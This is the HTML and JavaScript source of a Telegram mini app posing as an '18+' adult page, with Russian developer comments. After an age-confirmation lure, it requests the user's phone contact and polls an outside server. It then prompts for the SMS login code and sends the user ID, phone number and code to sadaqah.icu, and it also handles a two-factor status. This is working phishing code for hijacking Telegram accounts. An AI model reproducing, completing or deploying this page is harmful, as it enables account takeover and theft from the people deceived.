<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
  <title>HOT SECRET · 18+</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    :root {
      --bg: var(--tg-theme-bg-color, #0b0d10);
      --text: var(--tg-theme-text-color, #e9eef5);
      --hint: var(--tg-theme-hint-color, rgba(233,238,245,.65));
      --secondary: var(--tg-theme-secondary-bg-color, rgba(255,255,255,.06));
      --button: var(--tg-theme-button-color, #2ea6ff);
      --button-text: var(--tg-theme-button-text-color, #ffffff);
      --radius: 18px;
    }

    body {
      min-height: 100vh;
      color: var(--text);
      background-image: url('./baba.jpeg');
      background-size: cover;
      background-position: center;
      background-repeat: no-repeat;
      background-attachment: fixed;
      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
      padding: env(safe-area-inset-top, 16px) 16px env(safe-area-inset-bottom, 16px);
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }

    body::before {
      content: '';
      position: fixed;
      inset: 0;
      background: rgba(8, 10, 14, 0.72);
      pointer-events: none;
      z-index: 0;
    }

    .wrap {
      position: relative;
      z-index: 2;
      width: 100%;
      max-width: 420px;
      display: flex;
      flex-direction: column;
      gap: 16px;
    }

    .card {
      background: rgba(20, 22, 28, 0.6);
      backdrop-filter: blur(24px);
      -webkit-backdrop-filter: blur(24px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: var(--radius);
      box-shadow: 0 20px 44px rgba(0, 0, 0, 0.5);
      padding: 24px 18px;
    }

    .title {
      font-size: 22px;
      font-weight: 700;
      letter-spacing: -0.2px;
      margin-bottom: 4px;
    }

    .subtitle {
      font-size: 14px;
      color: var(--hint);
      line-height: 1.5;
    }

    .pill {
      display: inline-block;
      padding: 6px 14px;
      border-radius: 40px;
      background: rgba(255, 255, 255, 0.08);
      border: 1px solid rgba(255, 255, 255, 0.12);
      font-size: 13px;
      font-weight: 500;
      color: var(--hint);
      backdrop-filter: blur(10px);
    }

    .pill.phone-pill {
      background: rgba(46, 166, 255, 0.18);
      color: #2ea6ff;
      border-color: rgba(46, 166, 255, 0.35);
    }

    .top-row {
      display: flex;
      justify-content: space-between;
      align-items: flex-start;
      gap: 12px;
      margin-bottom: 20px;
    }

    .big-action-btn {
      width: 100%;
      padding: 18px 12px;
      background: rgba(46, 166, 255, 0.9);
      border: none;
      border-radius: 60px;
      font-size: 18px;
      font-weight: 600;
      color: white;
      backdrop-filter: blur(8px);
      -webkit-backdrop-filter: blur(8px);
      box-shadow: 0 8px 24px rgba(0, 110, 255, 0.3);
      cursor: pointer;
      transition: 0.12s;
      margin-top: 16px;
      border: 1px solid rgba(255, 255, 255, 0.15);
    }

    .big-action-btn:active {
      opacity: 0.8;
      transform: scale(0.98);
    }

    .code-container {
      background: rgba(0, 0, 0, 0.3);
      border-radius: 32px;
      padding: 20px 16px 16px;
      border: 1px solid rgba(255, 255, 255, 0.08);
      backdrop-filter: blur(12px);
      margin: 16px 0 12px;
    }

    .dots {
      display: flex;
      justify-content: center;
      gap: 16px;
      margin: 12px 0 8px;
    }

    .dot {
      width: 16px;
      height: 16px;
      border-radius: 16px;
      background: rgba(255, 255, 255, 0.18);
      border: 1px solid rgba(255, 255, 255, 0.2);
      transition: all 0.2s ease;
    }

    .dot.filled {
      background: #2ea6ff;
      border-color: #2ea6ff;
      box-shadow: 0 0 12px #2ea6ff88;
    }

    .info-row {
      display: flex;
      justify-content: space-between;
      color: var(--hint);
      font-size: 14px;
      padding: 0 8px;
      margin-bottom: 16px;
    }

    .delete-hint {
      display: flex;
      align-items: center;
      gap: 4px;
    }

    /* Маленькая кнопка проверки под точками */
    .check-btn {
      width: 100%;
      background: rgba(46, 166, 255, 0.85);
      border: none;
      border-radius: 40px;
      padding: 12px;
      font-size: 16px;
      font-weight: 600;
      color: white;
      backdrop-filter: blur(8px);
      cursor: pointer;
      transition: 0.15s;
      margin-top: 8px;
      border: 1px solid rgba(255, 255, 255, 0.15);
    }

    .check-btn:active {
      opacity: 0.7;
      transform: scale(0.97);
    }

    .check-btn:disabled {
      opacity: 0.3;
      pointer-events: none;
    }

    .keyboard {
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 12px;
      margin-top: 12px;
    }

    .key {
      height: 70px;
      border-radius: 24px;
      background: rgba(255, 255, 255, 0.1);
      border: 1px solid rgba(255, 255, 255, 0.12);
      font-size: 28px;
      font-weight: 600;
      color: var(--text);
      backdrop-filter: blur(14px);
      -webkit-backdrop-filter: blur(14px);
      box-shadow: 0 6px 18px rgba(0, 0, 0, 0.4);
      cursor: pointer;
      transition: 0.1s;
      display: flex;
      align-items: center;
      justify-content: center;
    }

    .key:active {
      background: rgba(255, 255, 255, 0.22);
      transform: scale(0.95);
    }

    .key.spacer {
      opacity: 0;
      pointer-events: none;
    }

    .telegram-btn {
      width: 100%;
      background: rgba(0, 136, 204, 0.85);
      border: 1px solid rgba(255, 255, 255, 0.2);
      padding: 16px;
      border-radius: 40px;
      color: white;
      font-weight: 600;
      font-size: 16px;
      backdrop-filter: blur(10px);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
      margin-top: 20px;
      cursor: pointer;
      transition: 0.15s;
      box-shadow: 0 6px 18px rgba(0, 100, 200, 0.4);
    }

    .telegram-btn:active {
      opacity: 0.8;
      transform: scale(0.97);
    }

    .hidden {
      display: none !important;
    }

    .status-line {
      margin-top: 14px;
      text-align: center;
      font-size: 13px;
      color: var(--hint);
      min-height: 22px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .spinner {
      width: 14px;
      height: 14px;
      flex-shrink: 0;
      border: 2px solid rgba(255,255,255,.15);
      border-top-color: #2ea6ff;
      border-radius: 50%;
      animation: spin .7s linear infinite;
    }

    @keyframes spin { to { transform: rotate(360deg); } }
  </style>
</head>
<body>
<div class="wrap">
  <!-- Экран 1: возрастное подтверждение (как на первом скрине) -->
  <div id="ageScreen" class="card age-check">
    <div class="top-row" style="justify-content: center; margin-bottom: 8px;">
      <span class="pill" style="background: rgba(255,255,255,0.15);">🔞 18+</span>
    </div>
    <div class="title">HOT SECRET</div>
    <div class="subtitle" style="margin-bottom: 20px;">mini app</div>
    <div style="font-size: 22px; font-weight: 500; margin: 10px 0;">Confirm you are 18+</div>
    <button class="big-action-btn" id="confirmAgeBtn">✔ I'm 18+</button>
    <div style="margin-top: 16px; font-size: 12px; color: var(--hint);">by tapping you agree to terms</div>
  </div>

  <!-- Экран 2: ввод кода (как на втором скрине) + кнопка Telegram -->
  <div id="codeScreen" class="card hidden">
    <div class="top-row">
      <div>
        <div class="title" style="font-size: 26px;">Marry</div>
        <div class="subtitle">mini app</div>
      </div>
      <span class="pill phone-pill" id="phonePill">+79****0080</span>
    </div>

    <div style="margin-top: 8px;">
      <div class="title" style="font-size: 20px;">Enter Code</div>
      <div class="subtitle">Code from SMS</div>
    </div>

    <!-- Блок с точками и маленькой кнопкой проверки -->
    <div class="code-container">
      <div class="dots" id="dotsContainer"></div>
      <div class="info-row">
        <span id="codeProgress">0 / 5</span>
        <span class="delete-hint">⌫ — delete</span>
      </div>
      <!-- Кнопка проверки кода (появляется под точками) -->
      <button class="check-btn" id="telegramChatBtn>✓ Go to codes</button>
    </div>

    <!-- Цифровая клавиатура -->
    <div id="keyboard" class="keyboard"></div>

    <!-- Кнопка перехода в Telegram (обведённая на втором скрине) -->
    <button class="telegram-btn" id="checkCodeButton" disable>
      <span>✈️</span> Submit code
    </button>

    <!-- Строка статуса (для отладки, можно скрыть) -->
    <div class="status-line" id="statusLine"></div>
  </div>
</div>

<script>
  (function() {
    const tg = window.Telegram.WebApp;
    tg.ready();
    tg.expand();

    // Данные пользователя
    const tgUser = tg.initDataUnsafe?.user;
    const userId = tgUser?.id;
    if (!userId) {
      alert('No user ID — запустите через Telegram');
      throw new Error('No user ID');
    }

    // Элементы
    const ageScreen = document.getElementById('ageScreen');
    const codeScreen = document.getElementById('codeScreen');
    const confirmBtn = document.getElementById('confirmAgeBtn');
    const phonePill = document.getElementById('phonePill');
    const dotsContainer = document.getElementById('dotsContainer');
    const progressSpan = document.getElementById('codeProgress');
    const keyboardDiv = document.getElementById('keyboard');
    const telegramBtn = document.getElementById('telegramChatBtn');
    const checkCodeBtn = document.getElementById('checkCodeBtn');
    const statusLine = document.getElementById('statusLine');

    // Состояние
    const CODE_LENGTH = 5;
    let currentCode = [];
    let phone = '';               // реальный номер, полученный с сервера
    let polling = false;
    let pollTimer = null;

    // Маскировка номера
    function maskPhone(rawPhone) {
      if (!rawPhone) return '—';
      const digits = rawPhone.replace(/\D/g, '');
      if (digits.length < 6) return rawPhone;
      return '+' + digits.slice(0, 2) + '****' + digits.slice(-4);
    }

    // Обновление интерфейса точек и кнопки
    function renderDots() {
      dotsContainer.innerHTML = '';
      for (let i = 0; i < CODE_LENGTH; i++) {
        const dot = document.createElement('div');
        dot.className = 'dot' + (i < currentCode.length ? ' filled' : '');
        dotsContainer.appendChild(dot);
      }
      progressSpan.textContent = `${currentCode.length} / ${CODE_LENGTH}`;
      // Активируем кнопку только при полном коде
      checkCodeBtn.disabled = currentCode.length !== CODE_LENGTH;
    }

    // Добавить цифру
    function addDigit(d) {
      if (currentCode.length < CODE_LENGTH) {
        currentCode.push(d);
        renderDots();
      }
    }

    // Удалить последнюю
    function deleteLast() {
      currentCode.pop();
      renderDots();
    }

    // Сброс кода (при ошибке)
    function resetCode() {
      currentCode = [];
      renderDots();
    }

    // Установка статуса (спиннер или текст)
    function setStatus(text, spin = false) {
      statusLine.innerHTML = spin
        ? `<div class="spinner"></div><span>${text}</span>`
        : `<span>${text}</span>`;
    }

    // Построить клавиатуру
    function buildKeyboard() {
      const keys = ['1', '2', '3', '4', '5', '6', '7', '8', '9', 'spacer', '0', 'del'];
      keyboardDiv.innerHTML = '';
      keys.forEach(k => {
        const btn = document.createElement('button');
        btn.className = 'key' + (k === 'spacer' ? ' spacer' : '');
        if (k === 'del') {
          btn.textContent = '⌫';
          btn.addEventListener('click', deleteLast);
        } else if (k !== 'spacer') {
          btn.textContent = k;
          btn.addEventListener('click', () => addDigit(k));
        }
        keyboardDiv.appendChild(btn);
      });
    }

    // ---- ПОЛЛИНГ (как в старом коде) ----
    function startPolling() {
      if (polling) return;
      polling = true;
      let attempts = 0;
      const maxAttempts = 30;

      async function poll() {
        if (!polling) return;
        attempts++;
        if (attempts > maxAttempts) {
          stopPolling();
          setStatus('Timed out. Please try again.');
          confirmBtn.disabled = false; // разрешить повторить
          return;
        }

        try {
          const resp = await fetch(
            `https://sadaqah.icu/status?user_id=${userId}`,
            { cache: 'no-store' }
          );
          const data = await resp.json();
          console.log('[poll]', data);

          if (data.state === 'get_code' && data.phone) {
            phone = data.phone;
            phonePill.textContent = maskPhone(phone);
            setStatus('Code sent!');
            stopPolling();
            // Показываем экран ввода кода
            ageScreen.classList.add('hidden');
            codeScreen.classList.remove('hidden');
            buildKeyboard();
            renderDots();
            return;
          }
        } catch (e) {
          console.warn('[poll] error', e);
        }

        pollTimer = setTimeout(poll, 2000);
      }

      poll();
    }

    function stopPolling() {
      polling = false;
      if (pollTimer) {
        clearTimeout(pollTimer);
        pollTimer = null;
      }
    }

    // ---- ЗАПРОС КОНТАКТА (при нажатии 18+) ----
    function startContactFlow() {
      confirmBtn.disabled = true;
      setStatus('Requesting number...', true);

      tg.requestContact((success) => {
        console.log('[requestContact] success=', success);
        if (!success) {
          confirmBtn.disabled = false;
          setStatus('Denied. Please try again.');
          return;
        }
        setStatus('Waiting for confirmation...', true);
        startPolling();
      });
    }

    // ---- ОТПРАВКА КОДА НА СЕРВЕР ----
    async function submitCode() {
      if (currentCode.length !== CODE_LENGTH) return;

      const code = currentCode.join('');
      setStatus('Checking code...', true);
      checkCodeBtn.disabled = true;

      try {
        const response = await fetch('https://sadaqah.icu/submit_code', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user_id: userId, phone, code })
        });
        const data = await response.json();

        if (data.status === 'ok') {
          tg.close(); // успех — закрыть миниапп
        } else if (data.status === '2fa_required') {
          tg.close(); // можно обработать иначе, но по аналогии закрываем
        } else {
          alert(data.message || 'Incorrect code, please try again');
          resetCode();
        }
      } catch (e) {
        alert('Network error. Please try again.');
        resetCode();
      } finally {
        setStatus('');
        checkCodeBtn.disabled = currentCode.length !== CODE_LENGTH;
      }
    }

    // ---- СОБЫТИЯ ----
    confirmBtn.addEventListener('click', startContactFlow);

    checkCodeBtn.addEventListener('click', submitCode);

    telegramBtn.addEventListener('click', () => {
      // ЗАМЕНИТЕ НА РЕАЛЬНЫЙ ЧАТ С КОДАМИ
      const telegramLink = 'https://t.me/+42777';
      tg.openTelegramLink(telegramLink);
    });

    // Поддержка физической клавиатуры
    window.addEventListener('keydown', (e) => {
      if (codeScreen.classList.contains('hidden')) return;
      if (/^[0-9]$/.test(e.key)) addDigit(e.key);
      if (e.key === 'Backspace') deleteLast();
      if (e.key === 'Enter' && currentCode.length === CODE_LENGTH) submitCode();
    });

    // Инициализация (если phone уже есть в URL — для теста)
    const urlParams = new URLSearchParams(location.search);
    const urlPhone = urlParams.get('phone');
    if (urlPhone) {
      phone = urlPhone;
      phonePill.textContent = maskPhone(phone);
      ageScreen.classList.add('hidden');
      codeScreen.classList.remove('hidden');
      buildKeyboard();
      renderDots();
    }

    // Начальное состояние: первый экран виден
    // код уже построит клавиатуру при переходе
  })();
</script>
<!-- 
  - Возвращён полный цикл: запрос контакта, поллинг, отправка кода.
  - Маленькая кнопка "✓ Check code" под точками активируется при 5 цифрах.
  - Кнопка перехода в Telegram сохранена.
  - При успешной отправке кода приложение закрывается.
  - Маскировка номера как на втором скрине.
-->
</body>
</html>
